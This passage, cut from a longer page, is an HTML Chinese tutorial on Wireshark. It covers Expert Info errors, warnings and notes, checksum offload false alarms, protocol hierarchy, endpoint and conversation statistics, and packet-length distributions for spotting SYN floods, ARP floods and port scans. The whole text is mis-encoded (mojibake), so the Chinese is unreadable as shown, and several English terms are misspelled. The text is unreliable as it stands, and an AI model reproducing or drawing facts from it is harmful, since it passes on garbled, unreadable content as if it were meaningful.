Commentsï¼šæŠŠå«æœ‰æ³¨é‡Šä¿¡æ¯çš„æ•°æ®åŒ…ä¸€ä¸€è®°å½•åœ¨æ¡ˆ</p></li></ol><p>å¯ä»¥é€šè¿‡ä¸“å®¶ä¿¡æ¯å¯¹å½“å‰ç½‘ç»œçš„ç¨³å®šæ€§æˆ–ç¨³å¥æ€§æœ‰ä¸€ä¸ªäº†è§£ã€‚</p><p>errorsï¼Œwarningsï¼Œnotesè¿™ä¸‰ä¸ªæ˜¯æœ€é‡è¦çš„ï¼Œé€šè¿‡åŒå‡»æŸä¸ªæ•°æ®æŠ¥ï¼Œå¯ä»¥åœ¨æ•°æ®åˆ—è¡¨åŒºæ˜¾ç¤ºï¼Œä¹Ÿå¯ä»¥å³é”®åº”ç”¨ä¸ºè¿‡æ»¤å™¨ï¼Œè¿‡æ»¤æŸ¥çœ‹ã€‚</p><p>è®¤è¯† Errors äº‹ä»¶ï¼š Wireshark æ„ŸçŸ¥åˆ°çš„å­ç±» Erroräº‹ä»¶ï¼Œä¸»è¦åˆ†ä¸ºä»¥ä¸‹ä¸¤ç§æƒ…å†µ</p><ol type="1"><li><p>æ ¡éªŒå’Œå‡ºé”™ï¼šæ—¢å¯èƒ½æ˜¯ Ethernet å¸§æˆ–è€… IPæ•°æ®åŒ…çœŸçš„é€šä¸è¿‡æ£€éªŒå’Œæ£€æŸ¥æ‰€è‡´ï¼Œä¹Ÿå¯èƒ½æ˜¯ checksum offloadå‚æ•°æ–¹é¢çš„é…ç½®é—®é¢˜</p><p>æ•°æ®æµåŠ¨æ–¹å‘ï¼šç½‘å¡ï¼ˆæ¥æ”¶ï¼‰&lt; - &gt; CPU (å¤„ç†) &lt; - &gt;Wiresharkï¼Œä¸ºäº†å‡è½» CPUçš„è´Ÿæ‹…ï¼Œæ ¡éªŒå’Œç°åœ¨æ˜¯æ”¾åœ¨ç½‘å¡ä¸Šåšã€‚ç½‘å¡é¦–å…ˆå¯¹åˆ°è¾¾è‡ªå·±çš„åŒ…ï¼Œæ£€éªŒäºŒå±‚ï¼ˆé“¾è·¯å±‚ï¼‰çš„æ ¡éªŒå’Œï¼Œå¦‚æœæ­¤æ ¡éªŒå’Œä¸å¯¹ï¼Œç›´æ¥ä¸¢å¼ƒï¼Œè‹¥æ­£ç¡®ï¼Œæ¥æ”¶ï¼Œå†ç„¶åæ ¡éªŒä¸‰å±‚çš„æ ¡éªŒå’Œã€‚æ‰€ä»¥ä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒWiresharkæŠ“ä¸åˆ°æ ¡éªŒå’Œé”™è¯¯çš„é—®é¢˜ï¼Œåªæœ‰ä¸€ç§æƒ…å†µå®ƒä¼šæŠ“åˆ°ï¼šè‡ªå·±äº§ç”Ÿçš„æ•°æ®åŒ…ï¼ˆå› ä¸ºè‡ªå·±äº§ç”Ÿçš„æ•°æ®æŠ¥è¢«CPU å¤„ç†æ—¶ï¼Œæ ¡éªŒå’Œæ˜¯ç©ºçš„ï¼Œæ ¡éªŒå’Œç”±ç½‘å¡è´Ÿè´£ï¼Œè€Œ Wireshark å°±æ˜¯æŠ“çš„ CPUä½ç½®çš„æ•°æ®åŒ…ï¼‰</p><p>æ ¡éªŒå’Œå‡ºé”™ï¼šæŸäº›æ“ä½œç³»ç»Ÿæ”¯æŒ checksumoffloadï¼ˆæ ¡éªŒå’Œè®¡ç®—ä¸‹æ”¾ï¼‰åŠŸèƒ½ã€‚ä¸ºäº†èŠ‚çœ CPU èµ„æºï¼Œæ“ä½œç³»ç»ŸæŠŠIPã€TCPã€UDP æ ¡éªŒå’Œè®¡ç®—åŠŸèƒ½ä¸‹æ”¾ç»™ NICï¼ˆç½‘å¡ï¼Œnetwork interfacecontrollerï¼Œä¹Ÿå«ç½‘ç»œæ¥å£æ§åˆ¶å™¨ï¼Œä¹Ÿå«ç½‘ç»œé€‚é…å™¨ï¼‰ï¼Œæ•°æ®åŒ…åœ¨å‡º NICçš„æ—¶å€™æ‰§è¡Œæ ¡éªŒå’Œè®¡ç®—ã€‚ä½†æ˜¯ Wireshark ä¼šåœ¨æ•°æ®åˆ°è¾¾ NICä¹‹å‰æŠ“å–æ•°æ®åŒ…ï¼Œæ­¤æ—¶ IPã€TCPã€UDP æ ¡éªŒå’Œå­—æ®µå€¼å¹¶æ²¡æœ‰ï¼Œäºæ˜¯ä¼šçœ‹åˆ°Wireshark æ„ŸçŸ¥åˆ°å¾ˆå¤šæ ¡éªŒå’Œæœ‰è¯¯ä¹‹ç±»çš„ Erroräº‹ä»¶ã€‚è€Œä¸”è¿™äº›æ ¡éªŒå’Œé”™è¯¯çš„æ•°æ®åŒ…çš„æº IP åœ°å€ä¸ºæœ¬æœº IP åœ°å€ã€‚è¿™æ ·çš„ Erroräº‹ä»¶å¯ä»¥å¿½ç•¥ä¸è€ƒè™‘ã€‚ä¹Ÿå¯ä»¥å…³é—­ Wireshark IPã€TCP çš„æ ¡éªŒå’Œæ£€æŸ¥åŠŸèƒ½ã€‚Wireshark 3.0.2é»˜è®¤æ˜¯å…³é—­çš„(æ–°ç‰ˆä¼°è®¡éƒ½é»˜è®¤å…³é—­äº†ï¼Œä¸ç¡®å®šçš„è¯ï¼Œå†æŒ‰ç…§ä¸‹é¢æ“ä½œä¸€é)</p><p>æ“ä½œæ–¹å¼ï¼šç¼–è¾‘ï¼ˆeditï¼‰ -&gt; é¦–é€‰é¡¹ï¼ˆpreferenceï¼‰ -&gt;åè®®ï¼ˆprotocolï¼‰-&gt; Ipv4 -&gt; å–æ¶ˆå‹¾é€‰ Validate the IPv4 checksum ifpossibleã€‚ç„¶åå†å¯¹ TCP ä¹Ÿå–æ¶ˆå‹¾é€‰é‚£ä¸ªã€‚</p></li><li><p>ä¼ªé€ çš„æ•°æ®åŒ…é—®é¢˜ï¼šä¸€èˆ¬æ˜¯å…·ä½“çš„åº”ç”¨å±‚åè®®é—®é¢˜ï¼Œä¹Ÿæœ‰å¯èƒ½æ˜¯Wireshark çš„åè®®è§£æé—®é¢˜</p></li></ol><p>è®¤è¯† Errors äº‹ä»¶ï¼šæ€»ç»“</p><p>å¯¹äºä¸€ä¸ªç½‘ç»œè€Œè¨€ï¼Œç©¿æ¢­äºå…¶ä¸­çš„æ•°æ®åŒ…åªè¦æœ‰ç™¾åˆ†ä¹‹ä¸€ã€äºŒçš„å®³ç¾¤ä¹‹é©¬ï¼ˆå³å…·å¤‡Error äº‹ä»¶ç‰¹å¾çš„æ•°æ®åŒ…ï¼‰ï¼Œä¸ä½†ä¼šå¯¼è‡´äº‹æ•…é¢‘å‘ï¼ˆæ¯”å¦‚ TCPé‡ä¼ ï¼‰ï¼Œè€Œä¸”ä¼šä½¿ç½‘ç»œå˜å¾—å¾ˆæ…¢ï¼Œå› æ­¤åªè¦ç½‘ç»œç”¨èµ·æ¥å¤§è‡´æ­£å¸¸ï¼ŒWiresharkæ˜¯ä¸å¯èƒ½æŠ“åˆ°é‚£ä¹ˆå¤šçœŸçš„å®³ç¾¤ä¹‹é©¬çš„ã€‚</p><p>Warningsï¼šæ‰€æŠ“æ•°æ®è¯†åˆ«å‡ºçš„ä¸€èˆ¬æ€§é—®é¢˜ã€‚æ¯”å¦‚ï¼Œæ„ŸçŸ¥åˆ°äº†å­˜åœ¨ TCP é›¶çª—å£ã€TCP window fullã€TCP æŠ¥æ–‡æ®µå¤±åºã€TCP æŠ¥æ–‡æ®µä¸¢å¤±ç­‰ç°è±¡ï¼Œåˆæˆ–è€…è¯†åˆ«å‡ºäº†ç›¸å…³ç½‘ç»œåè®®åœ¨è¿ä½œæ—¶å‘å‡ºçš„æ•°æ®åŒ…çš„å†…å®¹ä¸æ­£å¸¸æƒ…å†µä¸ä¸€è‡´ã€‚æ‰€è°“ä¸€èˆ¬æ€§é—®é¢˜å‡ ä¹éƒ½æ˜¯åº”ç”¨ç¨‹åºé—®é¢˜æˆ–é€šä¿¡é—®é¢˜ã€‚</p><p>è®¤è¯† Warnings äº‹ä»¶ï¼š Wireshark æ„ŸçŸ¥åˆ°çš„å­ç±» Erroräº‹ä»¶ï¼Œä¸»è¦åˆ†ä¸ºä»¥ä¸‹ä¸‰ç§æƒ…å†µ</p><ol type="1"><li>å« Reassembly å­—æ ·çš„å‡ ç§å­äº‹ä»¶ï¼šå¤§å¤šæ˜¯æŒ‡ Wireshark æŠ“åˆ°äº†æœªèƒ½é‡ç»„çš„æ•°æ®åŒ…ã€‚ä¸€èˆ¬è€Œè¨€ï¼Œè¿™éƒ½æ˜¯ Wireshark åè®®è§£æå™¨é—®é¢˜ã€‚</li><li>åœ¨ Summary ä¸€æ é‡Œå« window å­—æ ·çš„å­äº‹ä»¶ï¼šå‡ ä¹éƒ½æ˜¯æŒ‡ Wiresharkæ„ŸçŸ¥åˆ°äº†ç½‘ç»œä¸­å­˜åœ¨ TCP zero windown æˆ– window fullé—®é¢˜ï¼Œä¸€èˆ¬è€Œè¨€éƒ½æ˜¯å»ºç«‹ TCP è¿æ¥çš„ç«¯åˆ°ç«¯è®¾å¤‡å¿™ä¸è¿‡æ¥æ‰€è‡´ã€‚</li><li>åœ¨ Summary ä¸€æ é‡Œå« Segment å­—æ ·çš„å­äº‹ä»¶ï¼šWireshark ç”Ÿæˆ TCP æŠ¥æ–‡æ®µä¸¢å¤±äº‹ä»¶ä¿¡æ¯ï¼Œæ˜¯å› å…¶æœªæŠ“å…¨éš¶å±äºæŸè‚¡ TCP æ•°æ®æµçš„æ‰€æœ‰ TCP æŠ¥æ–‡æ®µï¼šç”ŸæˆTCP æŠ¥æ–‡æ®µå¤±åºäº‹ä»¶ä¿¡æ¯ï¼Œæ˜¯å› å…¶æ„ŸçŸ¥åˆ°äº† TCP æŠ¥æ–‡æ®µæœªæŒ‰å‘é€ä¸»æœºå‘å‡ºçš„é¡ºåºåˆ°è¾¾æ¥å—ä¸»æœº è¿™ä¸‰ç§å­äº‹ä»¶éƒ½å±äº TCPæ•…éšœï¼Œä¸€èˆ¬æ˜¯ç”±ç½‘ç»œæ•…éšœæ‰€å¼•å‘</li></ol><p>è®¤è¯† Warnings äº‹ä»¶ï¼šæ€»ç»“</p><p>Wireshark èƒ½æ„ŸçŸ¥æ•°æ®åŒ…ä¸­çš„ç§ç§ç‰¹å¾ï¼Œæ¯”å¦‚çª—å£å¤§å°å­—æ®µã€TCPæŠ¥æ–‡åœ¨ä¼ è¾“ä¸­æ˜¯å¦å¤±åºã€TCP æ•°æ®æ”¶åˆ°ä¹‹åæ˜¯å¦åšå‡ºç¡®è®¤ã€‚ä½†æ˜¯è¯·æ³¨æ„ï¼ŒWarningsäº‹ä»¶åªæ˜¯ Wireshark è‡ªè®¤ä¸ºæ¯”è¾ƒé‡è¦çš„äº‹ä»¶ï¼Œå´ä¹Ÿä¸å¯å…¨ä¿¡ï¼Œæ¯”å¦‚è¯´ Wiresharkæœªèƒ½æŠ“å–æ‰€æœ‰æ•°æ®åŒ…ï¼Œåˆ™å¿…ä¼šç”Ÿæˆ Warningsäº‹ä»¶ï¼Œä½†è¿™æœªå¿…å°±æ˜¯ç½‘ç»œé—®é¢˜ï¼Œå¯èƒ½åªæ˜¯æŠ“åŒ…æ—¶æœºæŠŠæ¡ã€‚</p><p>Notesï¼šæ‰€æŠ“æ•°æ®è¯†åˆ«å‡ºçš„å¯èƒ½ä¼šå‘æ•…éšœçš„å¼‚å¸¸ç°è±¡ã€‚æ¯”å¦‚ï¼Œæ„ŸçŸ¥åˆ°äº† TCPé‡ä¼ ã€‚é‡å¤ç¡®è®¤ã€ä»¥åŠå¿«é€Ÿé‡ä¼ ç­‰ç°è±¡ã€‚è™½ç„¶ä¸Šè¿°è¡Œä¸ºå¯èƒ½ä¼šå¯¹ç½‘ç»œäº§ç”Ÿä¸¥é‡å½±å“ï¼Œä½†ä¹Ÿå±äºTCP çš„æ­£å¸¸è¡Œä¸ºï¼Œæ‰€ä»¥è¢«å½’ç±»åœ¨Notesï¼Œæé†’ç”¨æˆ·è¿™äº›æ•°æ®æœ‰å¯¼è‡´é—®é¢˜çš„å«Œç–‘ã€‚</p><p>è®¤è¯† Notes äº‹ä»¶ï¼š Wireshark æ„ŸçŸ¥åˆ°çš„å­ç±» Erroräº‹ä»¶ï¼Œä¸»è¦åˆ†ä¸ºä»¥ä¸‹ä¸‰ç§æƒ…å†µ</p><ol type="1"><li>Summary-æ é‡Œå« Retransmissioylsã€Fast Retrarmsmissionsã€DuplifateACKå­—æ ·çš„å­äº‹ä»¶ï¼šé€šå¸¸é¢„ç¤ºç€ç½‘é€Ÿæ…¢ï¼‰ä¸¢åŒ…æˆ–è€…é€šè¿‡ TCPä¼ è¾“æ•°æ®çš„ä¸»æœºçš„åº”ç”¨ç¨‹åºå¿™ä¸è¿‡æ¥ã€‚</li><li>åœ¨ Summary ä¸€æ é‡Œå« Keep-Alive å­—æ ·çš„å­äº‹ä»¶ï¼šé€šå¸¸é¢„ç¤ºç€ TCP æˆ–è€…åŸºäº TCP çš„åº”ç”¨ç¨‹åºçš„é—®é¢˜ã€‚</li><li>åœ¨ Summary ä¸€æ é‡Œå« Time to liveå­—æ ·çš„å­äº‹ä»¶ï¼šé€šå¸¸é¢„ç¤ºçœ‹è·¯ç”±é—®é¢˜</li></ol><p>è®¤è¯† Notes äº‹ä»¶ï¼šæ€»ç»“ Notesäº‹ä»¶çš„æ¯ä¸€ç§å­äº‹ä»¶ï¼Œå¹¶éæ˜¯ç”±å®šçš„å‹Ÿä¸€ç§ç±»å‹çš„ç½‘ç»œæ•…éšœæ‰€å¯¼è‡´çš„ï¼Œä»¥ TCPé‡ä¼ ç°è±¡ä¸ºä¾‹ï¼Œå¯èƒ½æ˜¯å› ä¸ºåŒ…é”™è¯¯ï¼‰ç½‘ç»œçŠ¶æ€å·®ï¼ˆå¸¦å®½ä½ã€å»¶æ—¶é«˜ï¼‰ã€æœåŠ¡å™¨æˆ–å®¢æˆ·ç«¯åœæ­¢å“åº”ç­‰ã€‚Wiresharkåªæ˜¯é€šè¿‡ Expert Info å·¥å…·æç¤ºå­˜åœ¨ TCPé‡ä¼ ç°è±¡ï¼Œè‡³äºå¦‚ä½•å®šä½åŸå› æ‰¾åˆ°é—®é¢˜ï¼Œè¿˜å¾—é è‡ªå·±ã€‚</p><p>Chatsï¼Œå¯ä»¥ç»Ÿè®¡å„ç§æ•°æ®åŒ…çš„ä¸ªæ•°ï¼Œå°¤å…¶æ˜¯ TCP çš„ SYN çš„ä¸ªæ•°ï¼Œå¯ä»¥åˆ¤æ–­æ˜¯å¦æ­£åœ¨å—åˆ° SYN flood çš„æ”»å‡»ã€‚</p><p>æ€»ç»“ï¼š</p><ol type="1"><li>æœ‰æ—¶ Wireshark æ„ŸçŸ¥çš„ Warnings äº‹ä»¶æ— å…³ç´§è¦ï¼Œä½†æ˜¯è¯†åˆ«å‡ºçš„ Notesäº‹ä»¶å´ååä¼šå½±å“ç½‘ç»œæ€§èƒ½ï¼Œæ‰€ä»¥æ’é™¤æ•…éšœæ—¶ï¼Œéœ€è¦å…³æ³¨å†…åœ¨ï¼Œåˆ‡å‹¿åªçœ‹è¡¨é¢</li><li>Wireshark æ‘†ä¹Œé¾™çš„æƒ…å†µæ—¶æœ‰å‘ç”Ÿï¼Œæ—¢å¯èƒ½æ˜¯æ¯å¼“è›‡å½±ã€è°æŠ¥å†›æƒ…è¯¯æŠ¥æ•…éšœï¼›ä¹Ÿæœ‰å¯èƒ½ä¼šä¸€å¶éšœç›®æ„ŸçŸ¥ä¸åˆ°ç½‘ç»œçš„å¼‚å¸¸çŠ¶å†µã€‚</li><li>æ‰€ä»¥ Wireshark è™½ç„¶æ™ºèƒ½ï¼Œä½†ä¹Ÿä¸è¿‡æ˜¯ä¸ªå·¥å…·è€Œå·²ï¼Œè§£å†³ç½‘ç»œæ•…éšœé çš„è¿˜æ˜¯ç½‘ç®¡äººå‘˜çš„çŸ¥è¯†å‚¨å¤‡ã€‚</li></ol><h2 id="ç»Ÿè®¡">ç»Ÿè®¡</h2><h3 id="æ•è·æ–‡ä»¶å±æ€§ç»Ÿè®¡æ‘˜è¦è¯´æ˜">æ•è·æ–‡ä»¶å±æ€§(ç»Ÿè®¡æ‘˜è¦è¯´æ˜)</h3><p>èœå•æ  -&gt; ç»Ÿè®¡ -&gt; æ•è·æ–‡ä»¶å±æ€§</p><p>å¯¹æŠ“è·çš„æ•°æ®æŠ¥è¿›è¡Œå…¨å±€ç»Ÿè®¡</p><p>æŠ“å–æ•°æ®åŒ…çš„æ–‡ä»¶åï¼Œé•¿åº¦ï¼Œæ—¶é—´ï¼ŒæŠ“åŒ…æ¥å£ï¼Œè¿˜æœ‰ä¸€äº›æŠ“åŒ…é€Ÿåº¦ï¼Œå¤§å°ï¼Œæ¯”ä¾‹ç­‰ç»Ÿè®¡ä¿¡æ¯ã€‚</p><h3 id="åè®®åˆ†çº§">åè®®åˆ†çº§</h3><p>èœå•æ  -&gt; ç»Ÿè®¡ -&gt; åè®®åˆ†å±‚</p><p>ç»Ÿè®¡é€šä¿¡æµé‡ä¸­ä¸åŒåè®®å åŒä¸€å±‚æ¬¡çš„ç™¾åˆ†æ¯”ã€‚é€šè¿‡è¿™ä¸ªå·¥å…·çš„ç™¾åˆ†æ¯”å¯ä»¥å¯¹å…¨ç½‘æµé‡æœ‰ç›´è§‚çš„äº†è§£ï¼Œæ•´ä¸ªç½‘ç»œä¸­å“ªäº›æµé‡å ç”¨å¤šï¼Œå“ªäº›æµé‡å ç”¨å°‘ã€‚å¯ä»¥é€šè¿‡ç™¾åˆ†æ¯”æŸ¥çœ‹ç½‘ç»œå¼‚å¸¸ï¼Œæ¯”å¦‚:ARP æµé‡ä¸€èˆ¬æ˜¯ 0.0 å‡ % æˆ– 0.å‡ % ï¼Œå¦‚æœä½ çœ‹åˆ°ç½‘ç»œä¸­ ARP æµé‡ä¸º 10%æˆ–20%ï¼Œé‚£ä¹ˆç½‘ç»œä¸­å¤§æ¦‚ç‡æœ‰ ARP æ³›æ´ª æ”»å‡»</p><p>ä½¿ç”¨ UDP çš„ä¸€èˆ¬æœ‰ DNSã€OICQï¼Œä½¿ç”¨ TCP çš„ä¸€èˆ¬æœ‰ HTTPã€SSLã€Data</p><p>å„å­—æ®µè®²è§£ï¼š</p><ol type="1"><li>åè®®ï¼šæ•°æ®åŒ…æ‰€å½’å±çš„åè®®åç§°</li><li>æŒ‰åˆ†ç»„ç™¾åˆ†æ¯”ï¼šæŠ“åŒ…æ–‡ä»¶æ‰€å«æ•°æ®åŒ…ä¸ªæ•°åœ¨æ¯ä¸€ç§åè®®ç±»å‹ä¸­çš„å æ¯”ï¼ˆåŒä¸€å±‚ï¼‰</li><li>åˆ†ç»„ï¼šæ¯ç§åè®®ç±»å‹æ•°æ®åŒ…ä¸ªæ•°</li><li>æŒ‰å­—èŠ‚ç™¾åˆ†æ¯”ï¼šæŠ“åŒ…æ–‡ä»¶æ‰€å«æ•°æ®åŒ…å­—èŠ‚æ•°åœ¨æ¯ç§åè®®ç±»å‹ä¸­çš„å æ¯”ï¼ˆåŒä¸€å±‚ï¼‰</li><li>å­—èŠ‚ï¼šæ¯ç§åè®®ç±»å‹æ•°æ®åŒ…å­—èŠ‚æ•°</li><li>æ¯”ç‰¹æ¯ç§’ï¼šæŸç§åè®®ç±»å‹çš„æ•°æ®åŒ…åœ¨æŠ“åŒ…æ—¶æ®µå†…çš„ä¼ è¾“é€Ÿç‡</li><li>ç»“æŸåˆ†ç»„ï¼šéš¶å±äºè¯¥åè®®ç±»å‹çš„æ•°æ®åŒ…çš„<strong>çº¯ç²¹æ•°é‡</strong>ã€‚ï¼ˆä¸¾ä¾‹ï¼šæ¯”å¦‚å½“TCP åè®®çš„ Packets å’Œ End Packets æ•°é‡åˆ†åˆ«æ˜¯ 13716 å’Œ9425ï¼Œè¿™å°±è¡¨ç¤ºæŠ“å–çš„æ•°æ®ä¸­ï¼Œä»¥ TCP å°è£…æ•°æ®æ€»æ•°æ˜¯ 13716 ä¸ªï¼Œä½†åªæœ‰ 9425ä¸ªçº¯ TCP æ•°æ®åŒ…ï¼Œä¹Ÿå°±æ˜¯è¿˜æœ‰ 4291 ä¸ªæ•°æ®åŒ…åœ¨ TCPå¤´éƒ¨ä¹‹åè¿˜ç´§è·Ÿäº†é«˜å±‚åº”ç”¨åè®®å¤´éƒ¨ï¼Œæ¯”å¦‚ HTTP å¤´éƒ¨ï¼‰</li><li>ç»“æŸ å­—èŠ‚ï¼›éš¶å±äºè¯¥åè®®ç±»å‹çš„æ•°æ®åŒ…çš„çº¯ç²¹å­—èŠ‚æ•°</li><li>ç»“æŸ ä½æ¯ç§’ï¼šéš¶å±äºè¯¥åè®®ç±»å‹çš„æ•°æ®åŒ…åœ¨æŠ“åŒ…æ—¶æ®µå†…çº¯ç²¹ä¼ è¾“é€Ÿç‡</li></ol><p>æ¯”å¦‚ï¼š å‰å 1000 100ï¼Œå³ï¼š åé¢æ¯”å‰é¢å°‘å¾—ç¦»è°± è¿™ç§æƒ…å†µä¸‹ï¼Œ900å¤šä¸ªåœ¨ä¼ æ•°æ®çš„åŒ…ï¼Œå¾ˆå¤§ç¨‹åº¦ä¸Šæ˜¯åŸºäº TCP çš„æ”»å‡»</p><h3 id="ç«¯ç‚¹ä¸ä¼šè¯">ç«¯ç‚¹ä¸ä¼šè¯</h3><p>ç«¯ç‚¹æ˜¯ç»“ç‚¹ä¸ç»“ç‚¹ä¹‹é—´ï¼Œä¼šè¯æ˜¯ä¸€å¯¹ä¸€çš„ï¼Œå¯ä»¥é€šè¿‡ä»–ä»¬æ¥æ‰¾å‡ºå‘é€æµé‡ï¼Œå ç”¨å¸¦å®½å¤§çš„æˆ–æœ‰å¼‚å¸¸è¡Œä¸ºçš„ã€‚</p><h4 id="ç«¯ç‚¹">ç«¯ç‚¹</h4><p>ç½—åˆ—å‡ºæ‰€æœ‰äºŒå±‚ã€ä¸‰å±‚ã€å››å±‚èŠ‚ç‚¹æ•°æ®ç»Ÿè®¡ä¿¡æ¯ï¼Œè¿˜å¯ä»¥ä»é«˜åˆ°ä½æ’åˆ—ï¼Œé€šè¿‡è¿™äº›ç»Ÿè®¡ä¿¡æ¯ï¼Œå¯ä»¥å¾ˆå¥½è§£é‡Šä¸€ä¸‹ç°è±¡ï¼š</p><ol type="1"><li>MAC åœ°å€å°‘ï¼ŒIPç«¯ç‚¹å¤šï¼šè¿™ç§ç°è±¡å¯èƒ½çš„åŸå› æ˜¯æœ‰ä¸€å°è·¯ç”±å™¨æ¥è´Ÿè´£è½¬å‘æ‰€æœ‰è¿›å‡ºæœ¬åœ° LAN çš„ IPæµé‡ï¼Œä¹Ÿå°±æ˜¯è¯´æ‰€æœ‰æµé‡éƒ½æ˜¯ç”±æŸä¸€ä¸ª IPåœ°å€ä¸ºç½‘å…³åšé›†ä¸­è½¬å‘çš„ã€‚è¿™å±äºæ­£å¸¸ç°è±¡ã€‚</li><li>IP åœ°å€å°‘ï¼ŒTCP ç«¯ç‚¹ï¼ˆTCP ç«¯å£å·ï¼‰å¤šï¼šå³ æ¯ä¸ª lPéƒ½è¯•å›¾å»ºç«‹æˆ–å·²ç»å»ºç«‹å¤šæ¡ TCP è¿æ¥ã€‚å¯¹äºæ­¤ç°è±¡ï¼Œå¦‚æœå»ºç«‹å¤šæ¡è¿æ¥çš„ IPç«¯ç‚¹æ˜¯æœåŠ¡å™¨ï¼Œå°±å±äºæ­£å¸¸ç°è±¡ï¼Œå¦åˆ™ææœ‰å¯èƒ½å°±æ˜¯æœ‰äººåœ¨å‘åŠ¨ç½‘ç»œæ”»å‡»ï¼Œæ¯”å¦‚TCP SYN æ”»å‡»ã€‚</li></ol><h4 id="ä¼šè¯">ä¼šè¯</h4><ol type="1"><li>çª—å£å·¦ä¸‹è§’æ˜¾ç¤ºè¿‡æ»¤å™¨çš„é™åˆ¶å¤é€‰æ¡†ï¼šè¯¥çª—å£å°†ä¼šæ˜¾ç¤ºç»è¿‡æ˜¾ç¤ºè¿‡æ»¤å™¨è¿‡æ»¤çš„ä¿¡æ¯</li><li>çª—å£å·¦ä¸‹è§’ è§£æåç§°å¤é€‰æ¡†ï¼šç”¨ç›¸åº”çš„åå­—å–ä»£çª—å£æ˜¾ç¤ºçš„ä¿¡æ¯</li><li>Ethernetï¼šè§‚å¯Ÿå…·æœ‰ä¸åŒ MACåœ°å€çš„ä¸»æœºä¹‹é—´å‘ç”Ÿè¿‡ä»€ä¹ˆæ ·çš„äº¤æµã€‚é€šè¿‡æ­¤æ ‡ç­¾ï¼Œå¯ä»¥è§‚å¯Ÿæ˜¯å¦å‡ºç°äº†äºŒå±‚å¹¿æ’­é£æš´ï¼Œæˆ–è€…ä¼ªé€ MAC åœ°å€æ¬ºéª—æ”»å‡»ç­‰é—®é¢˜ã€</li><li>IPv4/IPv6ï¼šè§‚å¯Ÿå…·æœ‰ä¸åŒ IPåœ°å€ä¸»æœºä¹‹é—´æœ‰è¿‡ä»€ä¹ˆæ ·çš„æ²Ÿé€šã€‚é€šè¿‡æ­¤æ ‡ç­¾ï¼Œå¯ä»¥è§‚å¯Ÿæé«˜æ›å…‰ç‡çš„ IPåœ°å€ï¼Œåˆ¤æ–­æµé‡çš„å¼‚å¸¸ï¼Œåˆ¤æ–­æ˜¯å¦æœ‰é»‘å®¢å·¥å…·åœ¨æ‰«æç½‘ç»œï¼Œæˆ–è€…åˆ¤æ–­ç”±äºæ„ŸæŸ“ä¸Šè •è™«ç—…æ¯’æŒç»­å‘é€å·¨é‡Ping åŒ…çš„ä¸»æœºã€‚</li><li>TCP/UDPï¼šè§‚å¯Ÿå…·æœ‰ä¸åŒ IP åœ°å€çš„ä¸»æœºä¹‹é—´å»ºç«‹çš„å„ç§ TCP/UDPä¼šè¯ã€‚é€šè¿‡æ­¤æ ‡ç­¾ï¼Œå¯ä»¥è§‚å¯Ÿæ˜¯å¦æœ‰æŸä¸€å°ä¸»æœºæ‰“å¼€è¿‡å¤šçš„ TCP/UDPè¿æ¥ï¼Œå¯¹äºå•å°è€Œè¨€æ‰“å¼€ 10-20ä¸ªè¿æ¥åº”è¯¥æ˜¯æ­£å¸¸èŒƒç•´ï¼Œè‹¥è¿æ¥è¿‡ç™¾ï¼Œå°±å¯èƒ½æœ‰é—®é¢˜ã€‚æˆ–è€…åˆ¤æ–­æ˜¯å¦æœ‰ä¸»æœºè¯•å›¾ä¸ç¨€å¥‡å¤æ€ªçš„TCP/UDP ç›®çš„ç«¯å£å·å»ºç«‹è¿æ¥ï¼Œä¹Ÿå°±æ˜¯æ‰€è°“çš„ TCP/UDP ç«¯å£æ‰«æã€‚</li></ol><h3 id="åˆ†ç»„é•¿åº¦">åˆ†ç»„é•¿åº¦</h3><p>é€‰æ‹©ç»Ÿè®¡-&gt; åˆ†ç»„é•¿åº¦</p><p>ç»Ÿè®¡æ•°æ®æµé‡ä¸­åŒ…é•¿åº¦çš„åˆ†å¸ƒï¼Œé€šè¿‡æ•°æ®æŠ¥é•¿åº¦çš„åˆ†å¸ƒæƒ…å†µï¼Œå¯¹ç½‘ç»œæƒ…å†µåšä¸€ä¸ªå¤§æ¦‚çš„åˆ†æã€‚</p><p>æ­£å¸¸åŒ…çš„è¯ï¼Œå¤§éƒ¨åˆ†ä¸º 40-2559ï¼Œå°å‹å¸§ï¼ˆå°äº 40ï¼‰æˆ–å·¨å‹ä¾¦ï¼ˆå¤§äº2559ï¼‰æ”»å‡»ï¼Œå½“å°äº 40 æˆ–è€…å¤§äº 2559 çš„æ¯”ä¾‹å åˆ° 5%æˆ–10%æ—¶ï¼Œæœ‰å¯èƒ½å­˜åœ¨è¿™ç§æ”»å‡»ã€‚</p><p>å¯ä»¥é€šè¿‡æ˜¾ç¤ºè¿‡æ»¤å™¨è¾“å…¥åè®®ç±»å‹ï¼Œæ¯”å¦‚ï¼š arpï¼Œ tcpç­‰ï¼ŒæŸ¥çœ‹å„ç±»å‹åè®®çš„é•¿åº¦å¤§æ¦‚éƒ½æ˜¯å¤šå¤§ã€‚</p><p>40-319ï¼šå¤§éƒ¨åˆ†éƒ½æ˜¯å°å‹å¸§ï¼Œæ¯”å¦‚ï¼š</p><p>arpï¼šä¸€èˆ¬æ˜¯ 40 æˆ– 50 å¤šï¼Œä¸ºå°å‹å¸§</p><p>icmpï¼šping åŒ…ä¸€èˆ¬ 70 å¤šåˆ° 90 å¤šï¼Œåˆ«çš„å¯èƒ½åˆ° 100 å¤š 200 å¤šå·¦å³</p><p>dnsï¼š79 åˆ° 227 å·¦å³</p><p>tcp çš„æ§åˆ¶ä¿¡æ¯ï¼š50ï¼Œ60ï¼Œ70 ç­‰</p><p>320-2559ï¼šå¤§å‹å¸§ï¼Œä¸€èˆ¬ä¸º tcp ç¢ç‰‡åŒ…ä¸€èˆ¬ 800ï¼Œ900ï¼Œ1000 å¤š</p><p>TCP å’Œ IP å¤´éƒ¨å‡ä¸º 20 å­—èŠ‚ï¼ŒUDP å¤´éƒ¨ 8 å­—èŠ‚ï¼Œä»¥å¤ªç½‘å¸§ MTU 1500å­—èŠ‚ï¼Œé™¤å» TCPï¼ŒIP å¤´éƒ¨ï¼Œè¿˜å‰©ä¸‹ 1460 ä¸ªå­—èŠ‚ã€‚</p><p>é‡ç‚¹å…³æ³¨ 1280-2559é•¿åº¦çš„æ•°æ®åŒ…ï¼Œåƒè¿™ç§è¾ƒå¤§çš„æ•°æ®åŒ…ï¼Œä¸€èˆ¬æ˜¯ç”¨äºæ•°æ®ä¼ è¾“ï¼Œæ¯”å¦‚ï¼šhttpä¸‹è½½ï¼Œftpä¸Šä¼ 